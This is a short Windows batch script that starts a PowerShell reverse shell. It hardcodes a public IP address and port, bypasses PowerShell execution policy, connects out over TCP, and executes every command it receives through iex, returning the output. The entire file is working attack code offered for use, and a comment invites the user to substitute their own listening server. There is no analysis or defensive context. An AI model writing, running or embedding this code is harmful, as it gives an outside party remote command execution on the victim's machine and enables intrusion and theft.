@echo off
REM Change IP_ADDRESS and PORT to your listening server's IP and port
set lhost=52.166.51.220
set lport=4242

REM PowerShell reverse shell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('%lhost%',%lport%);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$buffer = New-Object System.Byte[] 1024;$encoding = New-Object System.Text.ASCIIEncoding;while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = $encoding.GetString($buffer, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$writer.Write($sendback + 'PS ' + (pwd).Path + '> ');$writer.Flush()};$client.Close()"
